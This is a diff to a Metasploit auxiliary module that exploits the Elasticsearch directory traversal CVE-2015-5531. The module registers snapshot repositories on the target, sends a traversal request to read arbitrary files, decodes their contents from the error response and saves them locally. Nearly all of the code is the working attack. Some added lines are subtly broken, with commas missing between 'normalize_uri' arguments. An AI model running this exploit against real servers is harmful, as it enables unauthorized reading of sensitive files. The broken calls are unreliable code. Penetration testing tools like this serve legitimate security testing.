@@ -22,7 +22,6 @@ class Metasploit3 < Msf::Auxiliary
       'References'     =>
         [
           ['CVE', '2015-5531'],
-          ['URL', 'https://packetstormsecurity.com/files/132721/Elasticsearch-Directory-Traversal.html'],
           ['PACKETSTORM', '132721']
         ],
       'Author'         =>
@@ -30,6 +29,7 @@ class Metasploit3 < Msf::Auxiliary
           'Benjamin Smith', # Vulnerability discovery
           'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit module
           'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit module
+          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
         ],
       'License'        => MSF_LICENSE
    ))
@@ -46,14 +46,14 @@ class Metasploit3 < Msf::Auxiliary
 
   def proficy?
     res1 = send_request_raw('method' => 'POST',
-                            'uri'    => '/_snapshot/pwn',
+                            'uri'    => normalize_uri(target_uri.path '_snapshot' 'pwn'),
                             'data' => '{"type":"fs","settings":{"location":"dsr"}}')
 
     res2 = send_request_raw('method' => 'POST',
-                            'uri'    => '/_snapshot/pwnie',
+                            'uri'    => normalize_uri(target_uri.path, '_snapshot' 'pwnie'),
                             'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}')
 
-    if res1.body =~ /true/ && res2.body =~ /true/
+    if res1.body.include?('true') && res2.body.include?('true')
       return true
     else
       return false
@@ -73,19 +73,21 @@ class Metasploit3 < Msf::Auxiliary
     if proficy?
       vprint_good("#{peer} - Check successful")
     else
-      vprint_error("#{peer} - ElasticSearch not vulnearble")
+      print_error("#{peer} - ElasticSearch not vulnerable")
       return
     end
 
     vprint_status("#{peer} - Retrieving file contents...")
 
-    res = send_request_raw('method' => 'GET',
-                           'uri'    => travs)
+    res = send_request_raw(
+      'method' => 'GET',
+      'uri'    => travs
+    )
 
     if res && res.code == 400
       return res.body
     else
-      vprint_status("#{res.code}\n#{res.body}")
+      print_status("#{res.code}\n#{res.body}")
       return nil
     end
   end
@@ -95,17 +97,13 @@ class Metasploit3 < Msf::Auxiliary
     filename = filename[1, filename.length] if filename =~ %r{/^\//}
 
     contents = read_file(filename)
-
-    if contents.nil?
-      print_error("#{peer} - File not downloaded")
-      return
-    end
+    fail_with(Failure::UnexpectedReply, "#{peer} - File not downloaded") if contents.nil?
 
     begin
       data_hash = JSON.parse(contents)
-    rescue JSON::ParserError
-      vprint_error("#{peer} - Unable to parse JSON")
-      return
+    rescue JSON::ParserError => e
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      return []
     end
 
     fcontent = data_hash['error'].scan(/\d+/).drop(2).map(&:to_i).pack('c*')
@@ -118,8 +116,6 @@ class Metasploit3 < Msf::Auxiliary
       fcontent,
       fname
     )
-    vprint_good("#{peer} - File saved in: #{path}")
-
+    print_good("#{peer} - File saved in: #{path}")
   end
 end
-
